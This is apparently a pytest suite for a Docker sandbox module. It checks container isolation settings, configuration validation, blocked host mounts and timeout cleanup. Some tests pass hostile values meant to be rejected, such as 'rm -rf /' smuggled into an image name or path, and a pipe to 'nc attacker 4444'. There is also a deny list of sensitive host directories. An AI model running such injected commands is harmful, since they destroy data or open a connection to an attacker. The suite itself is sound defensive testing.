"""
Unit tests for Member 3: Docker Sandbox & Execution Subsystem.

Tests all sandbox functionality using mocked Docker SDK objects.
No running Docker daemon is required.
"""

import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
import requests
from docker.errors import APIError, DockerException
from pydantic import ValidationError

from backend.testing_debugging.docker_sandbox import (
    DockerDaemonUnavailableError,
    DockerSandbox,
    DockerSandboxError,
    DockerSecurityViolationError,
    DockerTimeoutError,
)
from backend.testing_debugging.schemas import (
    ContainerStateEnum,
    ContainerStatus,
    DockerSandboxConfig,
    ExecutionResult,
)


# ============================================================================
# 1. Configuration & Validation Tests
# ============================================================================

def test_default_config():
    """Verify default sandbox security configuration parameters."""
    cfg = DockerSandboxConfig()
    assert cfg.image == "python:3.11-slim"
    assert cfg.timeout_seconds == 30
    assert cfg.memory_limit == "512m"
    assert cfg.nano_cpus == 1_000_000_000
    assert cfg.pids_limit == 100
    assert cfg.working_dir == "/workspace"
    assert cfg.network_mode == "none"
    assert cfg.user == "1000:1000"
    assert cfg.read_only_rootfs is False
    assert cfg.cap_drop == ["ALL"]
    assert cfg.environment == {}


def test_invalid_image_name():
    """Verify that empty images or shell injection attempts are rejected."""
    with pytest.raises(ValidationError):
        DockerSandboxConfig(image="")

    with pytest.raises(ValidationError):
        DockerSandboxConfig(image="python:3.11; rm -rf /")

    with pytest.raises(ValidationError):
        DockerSandboxConfig(image="python:3.11 | nc attacker 4444")


def test_invalid_timeout():
    """Verify that timeouts <= 0 or > 300 are rejected."""
    with pytest.raises(ValidationError):
        DockerSandboxConfig(timeout_seconds=0)

    with pytest.raises(ValidationError):
        DockerSandboxConfig(timeout_seconds=-5)

    with pytest.raises(ValidationError):
        DockerSandboxConfig(timeout_seconds=301)


def test_memory_limit_validation():
    """Verify memory limit format and minimum/maximum bounds."""
    # Valid configurations
    assert DockerSandboxConfig(memory_limit="256m").memory_limit == "256m"
    assert DockerSandboxConfig(memory_limit="1g").memory_limit == "1g"

    # Invalid formats
    with pytest.raises(ValidationError):
        DockerSandboxConfig(memory_limit="512")  # missing unit

    with pytest.raises(ValidationError):
        DockerSandboxConfig(memory_limit="invalid_mem")

    # Below minimum (32MB)
    with pytest.raises(ValidationError):
        DockerSandboxConfig(memory_limit="16m")

    # Above maximum (4GB)
    with pytest.raises(ValidationError):
        DockerSandboxConfig(memory_limit="8g")


def test_cpu_and_pids_limits_validation():
    """Verify CPU quotas and process limits bounds."""
    with pytest.raises(ValidationError):
        DockerSandboxConfig(nano_cpus=50_000_000)  # < 0.1 CPU

    with pytest.raises(ValidationError):
        DockerSandboxConfig(nano_cpus=5_000_000_000)  # > 4.0 CPUs

    with pytest.raises(ValidationError):
        DockerSandboxConfig(pids_limit=5)  # < 10

    with pytest.raises(ValidationError):
        DockerSandboxConfig(pids_limit=600)  # > 500


def test_working_dir_validation():
    """Verify working directory must be an absolute Unix path without injection characters."""
    with pytest.raises(ValidationError):
        DockerSandboxConfig(working_dir="relative/path")

    with pytest.raises(ValidationError):
        DockerSandboxConfig(working_dir="/workspace; rm -rf /")

    with pytest.raises(ValidationError):
        DockerSandboxConfig(working_dir="")


def test_network_mode_enforcement():
    """Verify that network_mode must strictly be 'none'."""
    with pytest.raises(ValidationError):
        DockerSandboxConfig(network_mode="bridge")

    with pytest.raises(ValidationError):
        DockerSandboxConfig(network_mode="host")


def test_environment_secret_detection():
    """Verify that passing sensitive keywords in environment variables is blocked."""
    with pytest.raises(ValidationError):
        DockerSandboxConfig(environment={"GEMINI_API_KEY": "secret_value"})

    with pytest.raises(ValidationError):
        DockerSandboxConfig(environment={"DB_PASSWORD": "password123"})

    with pytest.raises(ValidationError):
        DockerSandboxConfig(environment={"AUTH_TOKEN": "token123"})

    # Safe environment variables are allowed
    cfg = DockerSandboxConfig(environment={"PYTHONUNBUFFERED": "1", "PYTHONDONTWRITEBYTECODE": "1"})
    assert cfg.environment["PYTHONUNBUFFERED"] == "1"


# ============================================================================
# 2. Schema Models Validation Tests
# ============================================================================

def test_container_status_validation():
    """Verify ContainerStatus validation."""
    status = ContainerStatus(
        container_id="c_12345abc",
        state=ContainerStateEnum.RUNNING,
        image="python:3.11-slim",
    )
    assert status.container_id == "c_12345abc"
    assert status.state == ContainerStateEnum.RUNNING

    # Invalid exit code
    with pytest.raises(ValidationError):
        ContainerStatus(
            state=ContainerStateEnum.FAILED,
            image="python:3.11-slim",
            exit_code=300,
        )

    # Invalid container_id format
    with pytest.raises(ValidationError):
        ContainerStatus(
            container_id="invalid id with spaces; rm",
            state=ContainerStateEnum.RUNNING,
            image="python:3.11-slim",
        )


def test_execution_result_validation():
    """Verify ExecutionResult validation."""
    status = ContainerStatus(state=ContainerStateEnum.COMPLETED, image="python:3.11-slim", exit_code=0)
    result = ExecutionResult(
        exit_code=0,
        stdout="success output",
        stderr="",
        duration_seconds=1.25,
        timed_out=False,
        command="pytest",
        status=status,
    )
    assert result.exit_code == 0
    assert result.duration_seconds == 1.25
    assert result.command == "pytest"

    # Empty command string
    with pytest.raises(ValidationError):
        ExecutionResult(
            exit_code=0,
            command="",
            status=status,
        )

    # Empty command list
    with pytest.raises(ValidationError):
        ExecutionResult(
            exit_code=0,
            command=[],
            status=status,
        )

    # Negative duration
    with pytest.raises(ValidationError):
        ExecutionResult(
            exit_code=0,
            command="python",
            duration_seconds=-1.0,
            status=status,
        )


# ============================================================================
# 3. Docker Client Initialization & Daemon Availability Tests
# ============================================================================

def test_docker_client_lazy_initialization():
    """Verify Docker client initializes lazily from environment."""
    with patch("docker.from_env") as mock_from_env:
        mock_client = MagicMock()
        mock_from_env.return_value = mock_client

        sandbox = DockerSandbox()
        assert sandbox._client is None

        # Access property
        client = sandbox.client
        assert client == mock_client
        mock_from_env.assert_called_once()


def test_injected_docker_client():
    """Verify injected Docker client is used without contacting environment."""
    mock_client = MagicMock()
    with patch("docker.from_env") as mock_from_env:
        sandbox = DockerSandbox(docker_client=mock_client)
        assert sandbox.client == mock_client
        mock_from_env.assert_not_called()


def test_daemon_unavailable_on_client_init():
    """Verify DockerDaemonUnavailableError is raised if from_env fails."""
    with patch("docker.from_env", side_effect=DockerException("daemon unreachable")):
        sandbox = DockerSandbox()
        with pytest.raises(DockerDaemonUnavailableError) as exc_info:
            _ = sandbox.client
        assert "Failed to connect to Docker daemon" in str(exc_info.value)


def test_is_daemon_available_success():
    """Verify is_daemon_available returns True when ping succeeds."""
    mock_client = MagicMock()
    mock_client.ping.return_value = True
    sandbox = DockerSandbox(docker_client=mock_client)
    assert sandbox.is_daemon_available() is True
    mock_client.ping.assert_called_once()


def test_is_daemon_available_failure():
    """Verify is_daemon_available returns False when ping raises exception."""
    mock_client = MagicMock()
    mock_client.ping.side_effect = DockerException("Ping failed")
    sandbox = DockerSandbox(docker_client=mock_client)
    assert sandbox.is_daemon_available() is False


def test_execute_fails_when_daemon_unavailable():
    """Verify execute_command raises DockerDaemonUnavailableError if daemon is unavailable."""
    mock_client = MagicMock()
    mock_client.ping.side_effect = DockerException("Ping failed")
    sandbox = DockerSandbox(docker_client=mock_client)

    with pytest.raises(DockerDaemonUnavailableError):
        sandbox.execute_command(command="pytest")


# ============================================================================
# 4. Mount Security & Socket Prevention Tests
# ============================================================================

def test_forbidden_docker_socket_mount():
    """Verify mounting docker.sock is strictly blocked."""
    sandbox = DockerSandbox(docker_client=MagicMock())

    with pytest.raises(DockerSecurityViolationError) as exc_info:
        sandbox.validate_mount_security("/var/run/docker.sock")
    assert "strictly prohibited" in str(exc_info.value)

    with pytest.raises(DockerSecurityViolationError):
        sandbox.validate_mount_security(r"C:\Users\User\docker.sock")


def test_forbidden_docker_engine_pipe():
    """Verify mounting Windows docker_engine pipe is strictly blocked."""
    sandbox = DockerSandbox(docker_client=MagicMock())

    with pytest.raises(DockerSecurityViolationError) as exc_info:
        sandbox.validate_mount_security(r"\\.\pipe\docker_engine")
    assert "forbidden pattern" in str(exc_info.value)


def test_forbidden_system_dirs():
    """Verify mounting sensitive host directories is blocked."""
    sandbox = DockerSandbox(docker_client=MagicMock())

    for sensitive_path in ["/proc", "/sys", "/dev", "/etc", "/root", "/var/run"]:
        with pytest.raises(DockerSecurityViolationError):
            sandbox.validate_mount_security(sensitive_path)


def test_forbidden_root_filesystem_mount():
    """Verify mounting the root filesystem is blocked."""
    sandbox = DockerSandbox(docker_client=MagicMock())

    with pytest.raises(DockerSecurityViolationError):
        sandbox.validate_mount_security("/")

    with pytest.raises(DockerSecurityViolationError):
        sandbox.validate_mount_security("C:\\")


def test_nonexistent_workspace_mount():
    """Verify mounting a non-existent path raises FileNotFoundError."""
    sandbox = DockerSandbox(docker_client=MagicMock())

    with pytest.raises(FileNotFoundError):
        sandbox.validate_mount_security("C:/non_existent_directory_123456")


def test_non_directory_workspace_mount():
    """Verify mounting a file instead of a directory raises ValueError."""
    sandbox = DockerSandbox(docker_client=MagicMock())

    with tempfile.NamedTemporaryFile() as tmp_file:
        with pytest.raises(ValueError) as exc_info:
            sandbox.validate_mount_security(tmp_file.name)
        assert "must be a directory" in str(exc_info.value)


def test_valid_workspace_mount():
    """Verify mounting a valid existing directory succeeds."""
    sandbox = DockerSandbox(docker_client=MagicMock())

    with tempfile.TemporaryDirectory() as tmp_dir:
        resolved = sandbox.validate_mount_security(tmp_dir)
        assert resolved.exists()
        assert resolved.is_dir()
        assert resolved == Path(tmp_dir).resolve()


# ============================================================================
# 5. Container Creation & Resource Restrictions Tests
# ============================================================================

def test_create_container_security_arguments():
    """Verify that container creation enforces complete security guardrails."""
    mock_client = MagicMock()
    mock_client.ping.return_value = True
    mock_container = MagicMock()
    mock_client.containers.create.return_value = mock_container

    config = DockerSandboxConfig(
        image="python:3.11-slim",
        memory_limit="256m",
        nano_cpus=500_000_000,
        pids_limit=50,
        working_dir="/workspace",
        user="1000:1000",
    )
    sandbox = DockerSandbox(config=config, docker_client=mock_client)

    with tempfile.TemporaryDirectory() as tmp_dir:
        container = sandbox.create_container(
            command=["pytest", "-v"],
            host_workspace_path=tmp_dir,
        )

        assert container == mock_container
        mock_client.containers.create.assert_called_once()
        _, kwargs = mock_client.containers.create.call_args

        # Security Assertions
        assert kwargs["image"] == "python:3.11-slim"
        assert kwargs["command"] == ["pytest", "-v"]
        assert kwargs["network_mode"] == "none"  # Complete network isolation
        assert kwargs["privileged"] is False      # Non-privileged
        assert kwargs["cap_drop"] == ["ALL"]      # Drop all capabilities
        assert kwargs["mem_limit"] == "256m"     # Memory quota
        assert kwargs["nano_cpus"] == 500_000_000  # CPU quota
        assert kwargs["pids_limit"] == 50         # PID limit
        assert kwargs["user"] == "1000:1000"     # Non-root user
        assert kwargs["working_dir"] == "/workspace"
        assert kwargs["detach"] is True

        # Volume mount assertions
        expected_resolved = str(Path(tmp_dir).resolve())
        assert expected_resolved in kwargs["volumes"]
        assert kwargs["volumes"][expected_resolved]["bind"] == "/workspace"
        assert kwargs["volumes"][expected_resolved]["mode"] == "rw"


def test_create_container_docker_exception():
    """Verify Docker runtime exceptions during container creation are wrapped in DockerSandboxError."""
    mock_client = MagicMock()
    mock_client.ping.return_value = True
    mock_client.containers.create.side_effect = DockerException("Image not found")

    sandbox = DockerSandbox(docker_client=mock_client)
    with pytest.raises(DockerSandboxError) as exc_info:
        sandbox.create_container(command="pytest")
    assert "Docker runtime error during container creation" in str(exc_info.value)


# ============================================================================
# 6. Container Execution & Lifecycle Tests
# ============================================================================

def test_successful_container_execution():
    """Verify successful execution captures stdout, exit code 0, and cleans up."""
    mock_client = MagicMock()
    mock_client.ping.return_value = True

    mock_container = MagicMock()
    mock_container.id = "test_container_id_001"
    mock_container.wait.return_value = {"StatusCode": 0}
    mock_container.logs.side_effect = lambda stdout=False, stderr=False: (
        b"1 passed in 0.05s\n" if stdout else b""
    )
    mock_client.containers.create.return_value = mock_container

    sandbox = DockerSandbox(docker_client=mock_client)
    result = sandbox.execute_command(command=["pytest"])

    assert result.exit_code == 0
    assert "1 passed in 0.05s" in result.stdout
    assert result.stderr == ""
    assert result.timed_out is False
    assert result.container_id == "test_container_id_001"
    assert result.status.state == ContainerStateEnum.COMPLETED

    # Verify lifecycle calls
    mock_container.start.assert_called_once()
    mock_container.wait.assert_called_once()
    mock_container.remove.assert_called_once_with(force=True)


def test_nonzero_exit_code_execution():
    """Verify non-zero exit code captures stderr and marks status as FAILED."""
    mock_client = MagicMock()
    mock_client.ping.return_value = True

    mock_container = MagicMock()
    mock_container.id = "test_container_id_002"
    mock_container.wait.return_value = {"StatusCode": 1}
    mock_container.logs.side_effect = lambda stdout=False, stderr=False: (
        b"" if stdout else b"FAILED test_sample.py::test_fail - AssertionError\n"
    )
    mock_client.containers.create.return_value = mock_container

    sandbox = DockerSandbox(docker_client=mock_client)
    result = sandbox.execute_command(command="pytest")

    assert result.exit_code == 1
    assert "AssertionError" in result.stderr
    assert result.timed_out is False
    assert result.status.state == ContainerStateEnum.FAILED
    assert result.status.error_message is not None

    mock_container.remove.assert_called_once_with(force=True)


def test_timeout_handling_returns_result():
    """Verify timeout kills the container, records TIMED_OUT status, and cleans up."""
    mock_client = MagicMock()
    mock_client.ping.return_value = True

    mock_container = MagicMock()
    mock_container.id = "test_container_id_timeout"
    mock_container.wait.side_effect = requests.exceptions.ReadTimeout("Read timed out")
    mock_container.logs.side_effect = lambda stdout=False, stderr=False: (
        b"Starting infinite loop..." if stdout else b""
    )
    mock_client.containers.create.return_value = mock_container

    sandbox = DockerSandbox(docker_client=mock_client)
    result = sandbox.execute_command(command="python loop.py", timeout=5, raise_on_timeout=False)

    assert result.timed_out is True
    assert result.exit_code == 124  # Standard timeout exit code
    assert result.status.state == ContainerStateEnum.TIMED_OUT
    assert "[Execution Timed Out after 5 seconds]" in result.stderr

    # Verify kill and cleanup were called
    mock_container.kill.assert_called_once()
    mock_container.remove.assert_called_once_with(force=True)


def test_timeout_handling_raises_exception():
    """Verify timeout raises DockerTimeoutError when raise_on_timeout=True."""
    mock_client = MagicMock()
    mock_client.ping.return_value = True

    mock_container = MagicMock()
    mock_container.wait.side_effect = TimeoutError("Timed out")
    mock_client.containers.create.return_value = mock_container

    sandbox = DockerSandbox(docker_client=mock_client)
    with pytest.raises(DockerTimeoutError) as exc_info:
        sandbox.execute_command(command="python loop.py", timeout=2, raise_on_timeout=True)

    assert "Command execution timed out after 2 seconds" in str(exc_info.value)
    mock_container.remove.assert_called_once_with(force=True)


def test_container_cleanup_always_executed_on_error():
    """Verify container is forcefully removed even if container.start raises an exception."""
    mock_client = MagicMock()
    mock_client.ping.return_value = True

    mock_container = MagicMock()
    mock_container.start.side_effect = DockerException("OOM killed or start failed")
    mock_client.containers.create.return_value = mock_container

    sandbox = DockerSandbox(docker_client=mock_client)
    with pytest.raises(DockerSandboxError):
        sandbox.execute_command(command="pytest")

    mock_container.remove.assert_called_once_with(force=True)


def test_container_cleanup_helper():
    """Verify cleanup_container helper handles Container objects, IDs, and None safely."""
    mock_client = MagicMock()
    sandbox = DockerSandbox(docker_client=mock_client)

    # None container returns True
    assert sandbox.cleanup_container(None) is True

    # Container object
    mock_c = MagicMock()
    assert sandbox.cleanup_container(mock_c) is True
    mock_c.remove.assert_called_once_with(force=True)

    # Container ID string
    mock_target = MagicMock()
    mock_client.containers.get.return_value = mock_target
    assert sandbox.cleanup_container("cid_123") is True
    mock_client.containers.get.assert_called_once_with("cid_123")
    mock_target.remove.assert_called_once_with(force=True)


# ============================================================================
# 7. Isolated Workspace Management Tests
# ============================================================================

def test_create_and_cleanup_isolated_workspace():
    """Verify creation and cleanup of isolated temporary workspaces on host."""
    sandbox = DockerSandbox(docker_client=MagicMock())

    workspace = sandbox.create_isolated_workspace(prefix="test_autodev_")
    assert workspace.exists()
    assert workspace.is_dir()
    assert "test_autodev_" in workspace.name

    # Write a test file into the workspace
    test_file = workspace / "test.py"
    test_file.write_text("print('isolated')")
    assert test_file.exists()

    # Clean up workspace
    success = sandbox.cleanup_isolated_workspace(workspace)
    assert success is True
    assert not workspace.exists()


# ============================================================================
# 8. Context Manager Support Tests
# ============================================================================

def test_context_manager_support():
    """Verify DockerSandbox can be safely used as a context manager."""
    mock_client = MagicMock()
    with patch("docker.from_env", return_value=mock_client):
        with DockerSandbox() as sandbox:
            _ = sandbox.client

        mock_client.close.assert_called_once()

